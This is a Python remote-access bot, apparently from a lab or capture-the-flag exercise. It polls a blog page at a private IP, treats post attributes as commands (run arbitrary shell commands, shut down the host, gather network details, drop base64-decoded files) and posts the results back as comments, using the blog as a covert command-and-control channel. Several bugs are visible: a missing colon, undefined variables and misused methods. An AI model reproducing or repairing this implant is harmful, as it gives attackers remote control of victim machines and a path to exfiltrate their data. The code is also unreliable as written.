import requests
import subprocess
import re
import base64
import string
import secrets
from time import sleep
from BeautifulSoup import BeautifulSoup

URL='http://10.10.70.101'
COMPLETE_ACTIONS={}

def get_page():
    r = requests.get(URL)
    return BeautifulSoup(r._content)

def get_posts(soup):
    return soup.findAll("div", {"class": "post-post"})

def send_comment(payload):
    r = requests.post(URL + '/newcomment', data=payload)
    return r

def process_actions(posts):
    for post in posts:
        a_date = post.find("span", {"class": "post-date"}).getText()
        a_post = post.find("p", {"class": "post-body"})
        if a_date in COMPLETE_ACTIONS:
            print("Already ran command {0}".format(a_post))
        else:
            action = a_post.attrs("data-action",)
            if action == "shutdown-host"
                command = "shutdown /s /t 0"
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                data = proc.stdout.read() + proc.stderr.read()
            elif action == "shutdown-client":
                exit()
            elif action == "get-mac":
                command = "ipconfig /all"
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_v = proc.stdout.read() + proc.stderr.read()
                data = stdout_v.match("Physical")
            elif action == "upload-file":
                filebase64 = a_post.getText()
                fileraw = base64.b64decode(filebase64)
                filename=secrets.choice(string.ascii_uppercase)+secrets.choice(string.punctuation)\
                    +secrets.choice(string.ascii_lowercase)+secrets.choice(string.ascii_lowercase)\
                    +secrets.choice(string.digits)+secrets.choice(string.digits)+secrets.choice(string.digits)\
                    +secrets.choice(string.ascii_lowercase)
                with open(filename,'w+b') as f:
                    f.write(fileraw)
                data = "Saved file as {0}".format(filename)
            elif action == "shell-command":
                command = a_post.getText()
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                data = proc.stdout.read() + proc.stderr.read()
            post_id = post.find("a")['href'].split('/')[-1]
            print('Ran command: {0}\n{1}'.format(a_command, data))
            payload = {'username': 'bot', 'body': stdout_v, 'post_id': post_id}
            status = send_comment(payload)
            print('Status: {0}'.format(status))
            COMPLETE_ACTIONS[a_date] = a_post

while(True):
    page = get_page()
    posts = get_posts(page)
    process_actions(posts)
    sleep(30)
